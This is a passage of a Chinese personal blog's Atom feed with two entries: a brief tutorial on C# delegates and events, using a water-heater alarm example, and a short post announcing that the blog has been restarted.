    <title>C# 委托和事件</title>
    <link href="http://yoursite.com/2017/05/14/2017/CSharp_2017_05_14/"/>
    <id>http://yoursite.com/2017/05/14/2017/CSharp_2017_05_14/</id>
    <published>2017-05-13T16:00:00.000Z</published>
    <updated>2017-09-01T03:01:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>C# 中的委托和事件是理解这门语言的一道坎，这回记一下。本文能多简略就多简略，如果被想真正学习这方面知识不小心被搜索到，请移步其他大神的博客。</p>
<h2 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h2><p>并没有脱离开事件写过委托，但是委托确实是可以不和事件一起用的。委托是针对方法的一种归类方式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public delegate void PlayDelegate(string name);</div><div class="line">private void PlayBoy(string name) &#123;</div><div class="line">  Console.WriteLine(&quot;Hey &quot;+ name + &quot;, play with me?&quot;);</div><div class="line">&#125;</div><div class="line">private void PlayGirl(String name) &#123;</div><div class="line">  Console.WriteLine(&quot;Hey &quot;+ name + &quot;, play with me?&quot;);</div><div class="line">&#125;</div><div class="line">public void Play(string name, PlayDelegate playMethod) &#123;</div><div class="line">  playMethod(name);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>类似于python中的函数名称作为参数传递，只不过更为标准化。</p>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>不想搞得太复杂，直接上干货，经典的例子，烧水。</p>
<h3 id="Heater类："><a href="#Heater类：" class="headerlink" title="Heater类："></a>Heater类：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">public delegate void BoilHandler(object sender, BoilEventArgs e); </div><div class="line">public event BoilHandler BoilEvent;</div><div class="line">public class BoilEventArgs : EventArgs</div><div class="line">&#123;</div><div class="line">    public int temperature &#123; get; set; &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>以上的代码一般是在事件发出对象的内部写。使用public暴露事件。</p>
<h3 id="Alarm类"><a href="#Alarm类" class="headerlink" title="Alarm类"></a>Alarm类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">public void MakeAlert(object sender, EventArgs e) &#123;</div><div class="line">  ~~~</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="program"><a href="#program" class="headerlink" title="program"></a>program</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">heater.BoilEvent += MakeAlert;</div></pre></td></tr></table></figure>
<p>实际上如果<code>using system;</code>之后，可以用System命名空间下的EventHandler进行操作，看一下<a href="https://msdn.microsoft.com/en-us/library/system.eventhandler" target="_blank" rel="external">MSDN</a>吧，比较详细。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>发送者做好委托和事件的设定，包装好参数，事件定义为public，外部暴露后将接收方法注册到事件上，参数与委托中定义的一致。</p>
<p><img src="/img/2017/05/CSharp.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;C# 中的委托和事件是理解这门语言的一道坎，这回记一下。本文能多简略就多简略，如果被想真正学习这方面知识不小心被搜索到，请移步其他大神的博客。&lt;/p&gt;
&lt;h2 id=&quot;委托&quot;&gt;&lt;a href=&quot;#委托&quot; class=&quot;headerlink&quot; title=&quot;委托&quot;&gt;&lt;/a&gt;委
    
    </summary>
    
      <category term="Programing" scheme="http://yoursite.com/categories/Programing/"/>
    
    
      <category term="C#" scheme="http://yoursite.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>出事儿啦</title>
    <link href="http://yoursite.com/2017/03/17/Beginning/"/>
    <id>http://yoursite.com/2017/03/17/Beginning/</id>
    <published>2017-03-17T10:07:21.000Z</published>
    <updated>2017-09-01T03:01:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前的博客狗带了，备份的不是源文件，重做一份太麻烦。</p>
<p>新的开始。。</p>
<p><img src="/img/go_die.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前的博客狗带了，备份的不是源文件，重做一份太麻烦。&lt;/p&gt;
&lt;p&gt;新的开始。。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go_die.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;

    
    </summary>
    
      <category term="扯淡" scheme="http://yoursite.com/categories/%E6%89%AF%E6%B7%A1/"/>
    
    
      <category term="扯淡" scheme="http://yoursite.com/tags/%E6%89%AF%E6%B7%A1/"/>
    
  </entry>
  
</feed>
